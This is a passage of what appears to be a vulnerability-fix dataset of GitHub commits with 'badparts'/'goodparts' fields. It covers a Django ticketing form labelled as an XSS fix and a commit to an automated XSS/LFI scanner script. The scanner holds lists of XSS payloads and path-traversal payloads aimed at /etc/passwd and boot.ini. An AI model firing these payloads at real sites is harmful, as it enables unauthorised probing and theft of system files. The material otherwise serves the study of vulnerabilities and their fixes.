require_all_fields=False, *args, **kwargs\n        )\n        self.require_all_fields = require_all_fields\n        self.required = self.one_required\n\n    def clean(self, value) -> dict:\n        value = super().clean(value)\n        if self.one_required and (not value or not any(v for v in value)):\n            raise forms.ValidationError(self.error_messages['required'], code='required')\n        if self.require_all_fields and not all(v for v in value):\n            raise forms.ValidationError(self.error_messages['incomplete'], code='required')\n        return value\n\n\nclass BaseQuestionsForm(forms.Form):\n    \"\"\"\n    This form class is responsible for asking order-related questions. This includes\n    the attendee name for admission tickets, if the corresponding setting is enabled,\n    as well as additional questions defined by the organizer.\n    \"\"\"\n\n    def __init__(self, *args, **kwargs):\n        \"\"\"\n        Takes two additional keyword arguments:\n\n        :param cartpos: The cart position the form should be for\n        :param event: The event this belongs to\n        \"\"\"\n        cartpos = self.cartpos = kwargs.pop('cartpos', None)\n        orderpos = self.orderpos = kwargs.pop('orderpos', None)\n        pos = cartpos or orderpos\n        item = pos.item\n        questions = pos.item.questions_to_ask\n        event = kwargs.pop('event')\n\n        super().__init__(*args, **kwargs)\n\n        if item.admission and event.settings.attendee_names_asked:\n            self.fields['attendee_name_parts'] = NamePartsFormField(\n                max_length=255,\n                required=event.settings.attendee_names_required,\n                scheme=event.settings.name_scheme,\n                label=_('Attendee name'),\n                initial=(cartpos.attendee_name_parts if cartpos else orderpos.attendee_name_parts),\n            )\n        if item.admission and event.settings.attendee_emails_asked:\n            self.fields['attendee_email'] = forms.EmailField(\n                required=event.settings.attendee_emails_required,\n                label=_('Attendee email'),\n                initial=(cartpos.attendee_email if cartpos else orderpos.attendee_email)\n            )\n\n        for q in questions:\n            # Do we already have an answer? Provide it as the initial value\n            answers = [a for a in pos.answerlist if a.question_id == q.id]\n            if answers:\n                initial = answers[0]\n            else:\n                initial = None\n            tz = pytz.timezone(event.settings.timezone)\n            help_text = rich_text(q.help_text)\n            if q.type == Question.TYPE_BOOLEAN:\n                if q.required:\n                    # For some reason, django-bootstrap3 does not set the required attribute\n                    # itself.\n                    widget = forms.CheckboxInput(attrs={'required': 'required'})\n                else:\n                    widget = forms.CheckboxInput()\n\n                if initial:\n                    initialbool = (initial.answer == \"True\")\n                else:\n                    initialbool = False\n\n                field = forms.BooleanField(\n                    label=q.question, required=q.required,\n                    help_text=help_text,\n                    initial=initialbool, widget=widget,\n                )\n            elif q.type == Question.TYPE_NUMBER:\n                field = forms.DecimalField(\n                    label=q.question, required=q.required,\n                    help_text=q.help_text,\n                    initial=initial.answer if initial else None,\n                    min_value=Decimal('0.00'),\n                )\n            elif q.type == Question.TYPE_STRING:\n                field = forms.CharField(\n                    label=q.question, required=q.required,\n                    help_text=help_text,\n                    initial=initial.answer if initial else None,\n                )\n            elif q.type == Question.TYPE_TEXT:\n                field = forms.CharField(\n                    label=q.question, required=q.required,\n                    help_text=help_text,\n                    widget=forms.Textarea,\n                    initial=initial.answer if initial else None,\n                )\n            elif q.type == Question.TYPE_CHOICE:\n                field = forms.ModelChoiceField(\n                    queryset=q.options,\n                    label=q.question, required=q.required,\n                    help_text=help_text,\n                    widget=forms.Select,\n                    empty_label='',\n                    initial=initial.options.first() if initial else None,\n                )\n            elif q.type == Question.TYPE_CHOICE_MULTIPLE:\n                field = forms.ModelMultipleChoiceField(\n                    queryset=q.options,\n                    label=q.question, required=q.required,\n                    help_text=help_text,\n                    widget=forms.CheckboxSelectMultiple,\n                    initial=initial.options.all() if initial else None,\n                )\n            elif q.type == Question.TYPE_FILE:\n                field = forms.FileField(\n                    label=q.question, required=q.required,\n                    help_text=help_text,\n                    initial=initial.file if initial else None,\n                    widget=UploadedFileWidget(position=pos, event=event, answer=initial),\n                )\n            elif q.type == Question.TYPE_DATE:\n                field = forms.DateField(\n                    label=q.question, required=q.required,\n                    help_text=help_text,\n                    initial=dateutil.parser.parse(initial.answer).date() if initial and initial.answer else None,\n                    widget=DatePickerWidget(),\n                )\n            elif q.type == Question.TYPE_TIME:\n                field = forms.TimeField(\n                    label=q.question, required=q.required,\n                    help_text=help_text,\n                    initial=dateutil.parser.parse(initial.answer).time() if initial and initial.answer else None,\n                    widget=TimePickerWidget(time_format=get_format_without_seconds('TIME_INPUT_FORMATS')),\n                )\n            elif q.type == Question.TYPE_DATETIME:\n                field = SplitDateTimeField(\n                    label=q.question, required=q.required,\n                    help_text=help_text,\n                    initial=dateutil.parser.parse(initial.answer).astimezone(tz) if initial and initial.answer else None,\n                    widget=SplitDateTimePickerWidget(time_format=get_format_without_seconds('TIME_INPUT_FORMATS')),\n                )\n            field.question = q\n            if answers:\n                # Cache the answer object for later use\n                field.answer = answers[0]\n            self.fields['question_%s' % q.id] = field\n\n        responses = question_form_fields.send(sender=event, position=pos)\n        data = pos.meta_info_data\n        for r, response in sorted(responses, key=lambda r: str(r[0])):\n            for key, value in response.items():\n                # We need to be this explicit, since OrderedDict.update does not retain ordering\n                self.fields[key] = value\n                value.initial = data.get('question_form_data', {}).get(key)\n\n\nclass BaseInvoiceAddressForm(forms.ModelForm):\n    vat_warning = False\n\n    class Meta:\n        model = InvoiceAddress\n        fields = ('is_business', 'company', 'name_parts', 'street', 'zipcode', 'city', 'country', 'vat_id',\n                  'internal_reference', 'beneficiary')\n        widgets = {\n            'is_business': BusinessBooleanRadio,\n            'street': forms.Textarea(attrs={'rows': 2, 'placeholder': _('Street and Number')}),\n            'beneficiary': forms.Textarea(attrs={'rows': 3}),\n            'company': forms.TextInput(attrs={'data-display-dependency': '#id_is_business_1'}),\n            'vat_id': forms.TextInput(attrs={'data-display-dependency': '#id_is_business_1'}),\n            'internal_reference': forms.TextInput,\n        }\n        labels = {\n            'is_business': ''\n        }\n\n    def __init__(self, *args, **kwargs):\n        self.event = event = kwargs.pop('event')\n        self.request = kwargs.pop('request', None)\n        self.validate_vat_id = kwargs.pop('validate_vat_id')\n        self.all_optional = kwargs.pop('all_optional', False)\n        super().__init__(*args, **kwargs)\n        if not event.settings.invoice_address_vatid:\n            del self.fields['vat_id']\n\n        if not event.settings.invoice_address_required or self.all_optional:\n            for k, f in self.fields.items():\n                f.required = False\n                f.widget.is_required = False\n                if 'required' in f.widget.attrs:\n                    del f.widget.attrs['required']\n        elif event.settings.invoice_address_company_required and not self.all_optional:\n            self.initial['is_business'] = True\n\n            self.fields['is_business'].widget = BusinessBooleanRadio(require_business=True)\n            self.fields['company'].required = True\n            self.fields['company'].widget.is_required = True\n            self.fields['company'].widget.attrs['required'] = 'required'\n            del self.fields['company'].widget.attrs['data-display-dependency']\n            if 'vat_id' in self.fields:\n                del self.fields['vat_id'].widget.attrs['data-display-dependency']\n\n        self.fields['name_parts'] = NamePartsFormField(\n            max_length=255,\n            required=event.settings.invoice_name_required and not self.all_optional,\n            scheme=event.settings.name_scheme,\n            label=_('Name'),\n            initial=(self.instance.name_parts if self.instance else self.instance.name_parts),\n        )\n        if event.settings.invoice_address_required and not event.settings.invoice_address_company_required and not self.all_optional:\n            self.fields['name_parts'].widget.attrs['data-required-if'] = '#id_is_business_0'\n            self.fields['name_parts'].widget.attrs['data-no-required-attr'] = '1'\n            self.fields['company'].widget.attrs['data-required-if'] = '#id_is_business_1'\n\n        if not event.settings.invoice_address_beneficiary:\n            del self.fields['beneficiary']\n\n    def clean(self):\n        data = self.cleaned_data\n        if not data.get('is_business'):\n            data['company'] = ''\n        if self.event.settings.invoice_address_required:\n            if data.get('is_business') and not data.get('company'):\n                raise ValidationError(_('You need to provide a company name.'))\n            if not data.get('is_business') and not data.get('name_parts'):\n                raise ValidationError(_('You need to provide your name.'))\n\n        if 'vat_id' in self.changed_data or not data.get('vat_id'):\n            self.instance.vat_id_validated = False\n\n        self.instance.name_parts = data.get('name_parts')\n\n        if self.validate_vat_id and self.instance.vat_id_validated and 'vat_id' not in self.changed_data:\n            pass\n        elif self.validate_vat_id and data.get('is_business') and data.get('country') in EU_COUNTRIES and data.get('vat_id'):\n            if data.get('vat_id')[:2] != str(data.get('country')):\n                raise ValidationError(_('Your VAT ID does not match the selected country.'))\n            try:\n                result = vat_moss.id.validate(data.get('vat_id'))\n                if result:\n                    country_code, normalized_id, company_name = result\n                    self.instance.vat_id_validated = True\n                    self.instance.vat_id = normalized_id\n            except (vat_moss.errors.InvalidError, ValueError):\n                raise ValidationError(_('This VAT ID is not valid. Please re-check your input.'))\n            except vat_moss.errors.WebServiceUnavailableError:\n                logger.exception('VAT ID checking failed for country {}'.format(data.get('country')))\n                self.instance.vat_id_validated = False\n                if self.request and self.vat_warning:\n                    messages.warning(self.request, _('Your VAT ID could not be checked, as the VAT checking service of '\n                                                     'your country is currently not available. We will therefore '\n                                                     'need to charge VAT on your invoice. You can get the tax amount '\n                                                     'back via the VAT reimbursement process.'))\n            except vat_moss.errors.WebServiceError:\n                logger.exception('VAT ID checking failed for country {}'.format(data.get('country')))\n                self.instance.vat_id_validated = False\n                if self.request and self.vat_warning:\n                    messages.warning(self.request, _('Your VAT ID could not be checked, as the VAT checking service of '\n                                                     'your country returned an incorrect result. We will therefore '\n                                                     'need to charge VAT on your invoice. Please contact support to '\n                                                     'resolve this manually.'))\n        else:\n            self.instance.vat_id_validated = False\n\n\nclass BaseInvoiceNameForm(BaseInvoiceAddressForm):\n\n    def __init__(self, *args, **kwargs):\n        super().__init__(*args, **kwargs)\n        for f in list(self.fields.keys()):\n            if f != 'name':\n                del self.fields[f]\n"
                }
            },
            "msg": "Fix potential XSS in questions [not a vulnerability, thanks to CSP]"
        }
    },
    "https://github.com/asaygo/malwrforensics": {
        "73d12b579a488013c561179bb95b1d45c2b48e2f": {
            "url": "https://api.github.com/repos/asaygo/malwrforensics/commits/73d12b579a488013c561179bb95b1d45c2b48e2f",
            "html_url": "https://github.com/asaygo/malwrforensics/commit/73d12b579a488013c561179bb95b1d45c2b48e2f",
            "sha": "73d12b579a488013c561179bb95b1d45c2b48e2f",
            "keyword": "XSS improve",
            "diff": "diff --git a/scripts/beaxssf.py b/scripts/beaxssf.py\nindex a201fce..29ff78c 100644\n--- a/scripts/beaxssf.py\n+++ b/scripts/beaxssf.py\n@@ -11,7 +11,8 @@\n import re\n \n DEBUG = 0\n-xss_attacks = [ \"<script>alert(1);</script>\", \"<img src=x onerror=prompt(/test/)>\",\n+xss_attacks = [ \"<script>alert(1);</script>\", \"<script>prompt(1)</script>\",\n+                \"<img src=x onerror=prompt(/test/)>\",\n                 \"\\\"><script>alert(1);</script><div id=\\\"x\", \"</script><script>alert(1);</script>\",\n                 \"</title><script>alert(1);</script>\", \"<body background=\\\"javascript:alert(1)\\\">\",\n                 \"<img src=test123456.jpg onerror=alert(1)>\"]\n@@ -159,7 +160,7 @@ def check_lfi(host, page, method, params, hidden_param_name, hidden_param_value,\n     return\n \n \n-def scan_for_forms(fname, host, url):\n+def scan_for_forms(fname, host, url, scanopt):\n     print \"[+] Start scan\"\n     rtype=\"\"\n     has_form=0\n@@ -168,6 +169,7 @@ def scan_for_forms(fname, host, url):\n     hidden_param_value=[]\n     page = \"\"\n     form_counter = 0\n+\n     try:\n         with open(fname, \"r\") as f:\n             for line in f:\n@@ -176,9 +178,11 @@ def scan_for_forms(fname, host, url):\n                 #let's check if the page is vulnerable\n                 if line.find(\"</form>\") >=0:\n                     has_form=0\n-                    if len(page) > 0 and len(params) > 0:\n-                        check_xss(host, page, rtype, params, hidden_param_name, hidden_param_value, form_counter, url)\n-                        check_lfi(host, page, rtype, params, hidden_param_name, hidden_param_value, form_counter, url)\n+                    if len(page) > 0 and (len(params) > 0 or len(hidden_param_value) > 0):\n+                        if scanopt.find(\"--checkxss\") == 0 or scanopt.find(\"--all\") == 0:\n+                            check_xss(host, page, rtype, params, hidden_param_name, hidden_param_value, form_counter, url)\n+                        if scanopt.find(\"--checklfi\") == 0 or scanopt.find(\"--all\") == 0:\n+                            check_lfi(host, page, rtype, params, hidden_param_name, hidden_param_value, form_counter, url)\n                         params=[]\n                         hidden_param_name=[]\n                         hidden_param_value=[]\n@@ -186,10 +190,10 @@ def scan_for_forms(fname, host, url):\n \n                 #add input parameters to list\n                 if has_form == 1:\n-                    m_input = re.match(r'.*\\<(input|button)\\s[^\\>]*name=\"(\\w+)\"', line, re.M|re.I)\n+                    m_input = re.match(r'.*\\<(input|button)\\s[^\\>]*name=[\"\\'](\\w+)[\"\\']', line, re.M|re.I)\n                     if m_input:\n                         #check if the parameters already has a value assigned\n-                        m_value = re.match(r'.*\\<(input|button)\\s[^\\>]*value=\"(\\w+)\"', line, re.M|re.I)\n+                        m_value = re.match(r'.*\\<(input|button)\\s[^\\>]*value=[\"\\'](\\w+)[\"\\']', line, re.M|re.I)\n                         if m_value:\n                             hidden_param_name.append(m_input.group(2))\n                             hidden_param_value.append(m_value.group(2))\n@@ -197,9 +201,9 @@ def scan_for_forms(fname, host, url):\n                             params.append(m_input.group(2))\n \n                 #detect forms\n-                m_same      = re.match(r'.*\\<form\\>\"', line, re.M|re.I)\n-                m_action    = re.match(r'.*\\<form\\s[^\\>]*action=\"([\\w\\/\\.\\-\\#\\:]+)\"', line, re.M|re.I)\n-                m_reqtype   = re.match(r'.*\\<form\\s[^\\>]*method=\"([\\w\\/\\.\\-]+)\"', line, re.M|re.I)\n+                m_same      = re.match(r'.*\\<form\\>', line, re.M|re.I)\n+                m_action    = re.match(r'.*\\<form\\s[^\\>]*action=[\"\\']([\\w\\/\\.\\-\\#\\:]+)[\"\\']', line, re.M|re.I)\n+                m_reqtype   = re.match(r'.*\\<form\\s[^\\>]*method=[\"\\']([\\w\\/\\.\\-]+)[\"\\']', line, re.M|re.I)\n                 if m_action or m_same:\n                     has_form=1\n                     form_counter+=1\n@@ -222,19 +226,37 @@ def scan_for_forms(fname, host, url):\n \n     return\n \n-def banner():\n-    print \"BEstAutomaticXSSFinder v1.0\"\n-    print \"DISCLAIMER: For testing purposes only!\\n\"\n+def help():\n+    print \"--checkxss\\t\\tcheck webpage for XSS vunerabilities\"\n+    print \"--checklfi\\t\\tcheck webpage for local file inclusion (LFI) vulnerabilities\"\n+    print \"--all\\t\\t\\tthe tool will scan for both XSS and LFI vulnerabilities (default)\"\n+    print \"\\nExamples:\"\n+    print \"program http://example.com/guestbook\\t\\t\\tit will check for both XSS and LFI\"\n+    print \"program --checkxss http://example.com/guestbook\\t\\tit will check only for XSS\"\n \n ###MAIN###\n if __name__ == \"__main__\":\n-    banner()\n+    print \"BEstAutomaticXSSFinder v1.0\"\n+    print \"DISCLAIMER: For testing purposes only!\\n\"\n \n-    if len(sys.argv) != 2:\n-        print \"program [url]\"\n+    if len(sys.argv) < 2 or len(sys.argv) > 3:\n+        print \"program [scan options] [url]\\n\"\n+        help()\n         exit()\n \n-    url = sys.argv[1]\n+    scanopt =\"--all\"\n+    url = \"\"\n+    \n+    if sys.argv[1].find(\"http\") == 0:\n+        url = sys.argv[1]\n+        if len(sys.argv) == 3:\n+            scanopt = sys.argv[2]\n+    else:\n+        if len(sys.argv) == 3:\n+            if sys.argv[1].find(\"--check\") == 0:\n+                scanopt = sys.argv[1]\n+                url = sys.argv[2]\n+\n     if url.find(\"http\") != 0:\n         print \"[-] Invalid target\"\n         exit()\n@@ -256,8 +278,9 @@ def banner():\n         with open(\"tmpage.txt\", \"w\") as f:\n             f.write(s)\n \n-        scan_for_forms(\"tmpage.txt\", host, url)\n-        os.remove(\"tmpage.txt\")\n+        scan_for_forms(\"tmpage.txt\", host, url, scanopt)\n+        if DEBUG == 0:\n+            os.remove(\"tmpage.txt\")\n     except Exception, e:\n         print \"[-] Main(): Error \" + str(e)\n \n",
            "message": "",
            "files": {
                "/scripts/beaxssf.py": {
                    "changes": [
                        {
                            "diff": "\n import re\n \n DEBUG = 0\n-xss_attacks = [ \"<script>alert(1);</script>\", \"<img src=x onerror=prompt(/test/)>\",\n+xss_attacks = [ \"<script>alert(1);</script>\", \"<script>prompt(1)</script>\",\n+                \"<img src=x onerror=prompt(/test/)>\",\n                 \"\\\"><script>alert(1);</script><div id=\\\"x\", \"</script><script>alert(1);</script>\",\n                 \"</title><script>alert(1);</script>\", \"<body background=\\\"javascript:alert(1)\\\">\",\n                 \"<img src=test123456.jpg onerror=alert(1)>\"]\n",
                            "add": 2,
                            "remove": 1,
                            "filename": "/scripts/beaxssf.py",
                            "badparts": [
                                "xss_attacks = [ \"<script>alert(1);</script>\", \"<img src=x onerror=prompt(/test/)>\","
                            ],
                            "goodparts": [
                                "xss_attacks = [ \"<script>alert(1);</script>\", \"<script>prompt(1)</script>\",",
                                "                \"<img src=x onerror=prompt(/test/)>\","
                            ]
                        },
                        {
                            "diff": "\n     return\n \n \n-def scan_for_forms(fname, host, url):\n+def scan_for_forms(fname, host, url, scanopt):\n     print \"[+] Start scan\"\n     rtype=\"\"\n     has_form=0\n",
                            "add": 1,
                            "remove": 1,
                            "filename": "/scripts/beaxssf.py",
                            "badparts": [
                                "def scan_for_forms(fname, host, url):"
                            ],
                            "goodparts": [
                                "def scan_for_forms(fname, host, url, scanopt):"
                            ]
                        },
                        {
                            "diff": "\n                 #let's check if the page is vulnerable\n                 if line.find(\"</form>\") >=0:\n                     has_form=0\n-                    if len(page) > 0 and len(params) > 0:\n-                        check_xss(host, page, rtype, params, hidden_param_name, hidden_param_value, form_counter, url)\n-                        check_lfi(host, page, rtype, params, hidden_param_name, hidden_param_value, form_counter, url)\n+                    if len(page) > 0 and (len(params) > 0 or len(hidden_param_value) > 0):\n+                        if scanopt.find(\"--checkxss\") == 0 or scanopt.find(\"--all\") == 0:\n+                            check_xss(host, page, rtype, params, hidden_param_name, hidden_param_value, form_counter, url)\n+                        if scanopt.find(\"--checklfi\") == 0 or scanopt.find(\"--all\") == 0:\n+                            check_lfi(host, page, rtype, params, hidden_param_name, hidden_param_value, form_counter, url)\n                         params=[]\n                         hidden_param_name=[]\n                         hidden_param_value=[]\n",
                            "add": 5,
                            "remove": 3,
                            "filename": "/scripts/beaxssf.py",
                            "badparts": [
                                "                    if len(page) > 0 and len(params) > 0:",
                                "                        check_xss(host, page, rtype, params, hidden_param_name, hidden_param_value, form_counter, url)",
                                "                        check_lfi(host, page, rtype, params, hidden_param_name, hidden_param_value, form_counter, url)"
                            ],
                            "goodparts": [
                                "                    if len(page) > 0 and (len(params) > 0 or len(hidden_param_value) > 0):",
                                "                        if scanopt.find(\"--checkxss\") == 0 or scanopt.find(\"--all\") == 0:",
                                "                            check_xss(host, page, rtype, params, hidden_param_name, hidden_param_value, form_counter, url)",
                                "                        if scanopt.find(\"--checklfi\") == 0 or scanopt.find(\"--all\") == 0:",
                                "                            check_lfi(host, page, rtype, params, hidden_param_name, hidden_param_value, form_counter, url)"
                            ]
                        },
                        {
                            "diff": "\n \n                 #add input parameters to list\n                 if has_form == 1:\n-                    m_input = re.match(r'.*\\<(input|button)\\s[^\\>]*name=\"(\\w+)\"', line, re.M|re.I)\n+                    m_input = re.match(r'.*\\<(input|button)\\s[^\\>]*name=[\"\\'](\\w+)[\"\\']', line, re.M|re.I)\n                     if m_input:\n                         #check if the parameters already has a value assigned\n-                        m_value = re.match(r'.*\\<(input|button)\\s[^\\>]*value=\"(\\w+)\"', line, re.M|re.I)\n+                        m_value = re.match(r'.*\\<(input|button)\\s[^\\>]*value=[\"\\'](\\w+)[\"\\']', line, re.M|re.I)\n                         if m_value:\n                             hidden_param_name.append(m_input.group(2))\n                             hidden_param_value.append(m_value.group(2))\n",
                            "add": 2,
                            "remove": 2,
                            "filename": "/scripts/beaxssf.py",
                            "badparts": [
                                "                    m_input = re.match(r'.*\\<(input|button)\\s[^\\>]*name=\"(\\w+)\"', line, re.M|re.I)",
                                "                        m_value = re.match(r'.*\\<(input|button)\\s[^\\>]*value=\"(\\w+)\"', line, re.M|re.I)"
                            ],
                            "goodparts": [
                                "                    m_input = re.match(r'.*\\<(input|button)\\s[^\\>]*name=[\"\\'](\\w+)[\"\\']', line, re.M|re.I)",
                                "                        m_value = re.match(r'.*\\<(input|button)\\s[^\\>]*value=[\"\\'](\\w+)[\"\\']', line, re.M|re.I)"
                            ]
                        },
                        {
                            "diff": "\n                             params.append(m_input.group(2))\n \n                 #detect forms\n-                m_same      = re.match(r'.*\\<form\\>\"', line, re.M|re.I)\n-                m_action    = re.match(r'.*\\<form\\s[^\\>]*action=\"([\\w\\/\\.\\-\\#\\:]+)\"', line, re.M|re.I)\n-                m_reqtype   = re.match(r'.*\\<form\\s[^\\>]*method=\"([\\w\\/\\.\\-]+)\"', line, re.M|re.I)\n+                m_same      = re.match(r'.*\\<form\\>', line, re.M|re.I)\n+                m_action    = re.match(r'.*\\<form\\s[^\\>]*action=[\"\\']([\\w\\/\\.\\-\\#\\:]+)[\"\\']', line, re.M|re.I)\n+                m_reqtype   = re.match(r'.*\\<form\\s[^\\>]*method=[\"\\']([\\w\\/\\.\\-]+)[\"\\']', line, re.M|re.I)\n                 if m_action or m_same:\n                     has_form=1\n                     form_counter+=1\n",
                            "add": 3,
                            "remove": 3,
                            "filename": "/scripts/beaxssf.py",
                            "badparts": [
                                "                m_same      = re.match(r'.*\\<form\\>\"', line, re.M|re.I)",
                                "                m_action    = re.match(r'.*\\<form\\s[^\\>]*action=\"([\\w\\/\\.\\-\\#\\:]+)\"', line, re.M|re.I)",
                                "                m_reqtype   = re.match(r'.*\\<form\\s[^\\>]*method=\"([\\w\\/\\.\\-]+)\"', line, re.M|re.I)"
                            ],
                            "goodparts": [
                                "                m_same      = re.match(r'.*\\<form\\>', line, re.M|re.I)",
                                "                m_action    = re.match(r'.*\\<form\\s[^\\>]*action=[\"\\']([\\w\\/\\.\\-\\#\\:]+)[\"\\']', line, re.M|re.I)",
                                "                m_reqtype   = re.match(r'.*\\<form\\s[^\\>]*method=[\"\\']([\\w\\/\\.\\-]+)[\"\\']', line, re.M|re.I)"
                            ]
                        },
                        {
                            "diff": "\n \n     return\n \n-def banner():\n-    print \"BEstAutomaticXSSFinder v1.0\"\n-    print \"DISCLAIMER: For testing purposes only!\\n\"\n+def help():\n+    print \"--checkxss\\t\\tcheck webpage for XSS vunerabilities\"\n+    print \"--checklfi\\t\\tcheck webpage for local file inclusion (LFI) vulnerabilities\"\n+    print \"--all\\t\\t\\tthe tool will scan for both XSS and LFI vulnerabilities (default)\"\n+    print \"\\nExamples:\"\n+    print \"program http://example.com/guestbook\\t\\t\\tit will check for both XSS and LFI\"\n+    print \"program --checkxss http://example.com/guestbook\\t\\tit will check only for XSS\"\n \n ###MAIN###\n if __name__ == \"__main__\":\n-    banner()\n+    print \"BEstAutomaticXSSFinder v1.0\"\n+    print \"DISCLAIMER: For testing purposes only!\\n\"\n \n-    if len(sys.argv) != 2:\n-        print \"program [url]\"\n+    if len(sys.argv) < 2 or len(sys.argv) > 3:\n+        print \"program [scan options] [url]\\n\"\n+        help()\n         exit()\n \n-    url = sys.argv[1]\n+    scanopt =\"--all\"\n+    url = \"\"\n+    \n+    if sys.argv[1].find(\"http\") == 0:\n+        url = sys.argv[1]\n+        if len(sys.argv) == 3:\n+            scanopt = sys.argv[2]\n+    else:\n+        if len(sys.argv) == 3:\n+            if sys.argv[1].find(\"--check\") == 0:\n+                scanopt = sys.argv[1]\n+                url = sys.argv[2]\n+\n     if url.find(\"http\") != 0:\n         print \"[-] Invalid target\"\n         exit()\n",
                            "add": 25,
                            "remove": 7,
                            "filename": "/scripts/beaxssf.py",
                            "badparts": [
                                "def banner():",
                                "    print \"BEstAutomaticXSSFinder v1.0\"",
                                "    print \"DISCLAIMER: For testing purposes only!\\n\"",
                                "    banner()",
                                "    if len(sys.argv) != 2:",
                                "        print \"program [url]\"",
                                "    url = sys.argv[1]"
                            ],
                            "goodparts": [
                                "def help():",
                                "    print \"--checkxss\\t\\tcheck webpage for XSS vunerabilities\"",
                                "    print \"--checklfi\\t\\tcheck webpage for local file inclusion (LFI) vulnerabilities\"",
                                "    print \"--all\\t\\t\\tthe tool will scan for both XSS and LFI vulnerabilities (default)\"",
                                "    print \"\\nExamples:\"",
                                "    print \"program http://example.com/guestbook\\t\\t\\tit will check for both XSS and LFI\"",
                                "    print \"program --checkxss http://example.com/guestbook\\t\\tit will check only for XSS\"",
                                "    print \"BEstAutomaticXSSFinder v1.0\"",
                                "    print \"DISCLAIMER: For testing purposes only!\\n\"",
                                "    if len(sys.argv) < 2 or len(sys.argv) > 3:",
                                "        print \"program [scan options] [url]\\n\"",
                                "        help()",
                                "    scanopt =\"--all\"",
                                "    url = \"\"",
                                "    if sys.argv[1].find(\"http\") == 0:",
                                "        url = sys.argv[1]",
                                "        if len(sys.argv) == 3:",
                                "            scanopt = sys.argv[2]",
                                "    else:",
                                "        if len(sys.argv) == 3:",
                                "            if sys.argv[1].find(\"--check\") == 0:",
                                "                scanopt = sys.argv[1]",
                                "                url = sys.argv[2]"
                            ]
                        },
                        {
                            "diff": "\n         with open(\"tmpage.txt\", \"w\") as f:\n             f.write(s)\n \n-        scan_for_forms(\"tmpage.txt\", host, url)\n-        os.remove(\"tmpage.txt\")\n+        scan_for_forms(\"tmpage.txt\", host, url, scanopt)\n+        if DEBUG == 0:\n+            os.remove(\"tmpage.txt\")\n     except Exception, e:\n         print \"[-] Main(): Error \" + str(e)\n \n",
                            "add": 3,
                            "remove": 2,
                            "filename": "/scripts/beaxssf.py",
                            "badparts": [
                                "        scan_for_forms(\"tmpage.txt\", host, url)",
                                "        os.remove(\"tmpage.txt\")"
                            ],
                            "goodparts": [
                                "        scan_for_forms(\"tmpage.txt\", host, url, scanopt)",
                                "        if DEBUG == 0:",
                                "            os.remove(\"tmpage.txt\")"
                            ]
                        }
                    ],
                    "source": "\n import sys import os import requests import re DEBUG=0 xss_attacks=[ \"<script>alert(1);</script>\", \"<img src=x onerror=prompt(/test/)>\", \"\\\"><script>alert(1);</script><div id=\\\"x\", \"</script><script>alert(1);</script>\", \"</title><script>alert(1);</script>\", \"<body background=\\\"javascript:alert(1)\\\">\", \"<img src=test123456.jpg onerror=alert(1)>\"] lfi_attacks=[ '../../etc/passwd', '../../../etc/passwd', '../../../../etc/passwd', '../../../../../etc/passwd', '../../../../../../etc/passwd', '../../../../../../../etc/passwd', '../../../../../../../../etc/passwd', '%2e%2e%2f%2e%2e%2fetc%2fpasswd', '%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd', '%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd', '%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd', '%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd', '%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd', '%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd', '../../etc/passwd%00', '../../../etc/passwd%00', '../../../../etc/passwd%00', '../../../../../etc/passwd%00', '../../../../../../etc/passwd%00', '../../../../../../../etc/passwd%00', '../../../../../../../../etc/passwd%00', '%2e%2e%2f%2e%2e%2fetc%2fpasswd%00', '%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd%00', '%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd%00', '%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd%00', '%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd%00', '%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd%00', '%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd%00', '../../boot.ini', '../../../boot.ini', '../../../../boot.ini', '../../../../../boot.ini', '../../../../../../boot.ini', '../../../../../../../boot.ini', '../../../../../../../../boot.ini', '%2e%2e%2f%2e%2e%2fboot%2eini', '%2e%2e%2f%2e%2e%2f%2e%2e%2fboot%2eini', '%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2fboot%2eini', '%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2fboot%2eini', '%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2fboot%2eini', '%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2fboot%2eini', '%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2fboot%2eini', '../../boot.ini%00', '../../../boot.ini%00', '../../../../boot.ini%00', '../../../../../boot.ini%00', '../../../../../../boot.ini%00', '../../../../../../../boot.ini%00', '../../../../../../../../boot.ini%00', '%2e%2e%2f%2e%2e%2fboot%2eini%00', '%2e%2e%2f%2e%2e%2f%2e%2e%2fboot%2eini%00', '%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2fboot%2eini%00', '%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2fboot%2eini%00', '%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2fboot%2eini%00', '%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2fboot%2eini%00', '%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2fboot%2eini' ] lfi_expect=['[operating systems]', '[boot 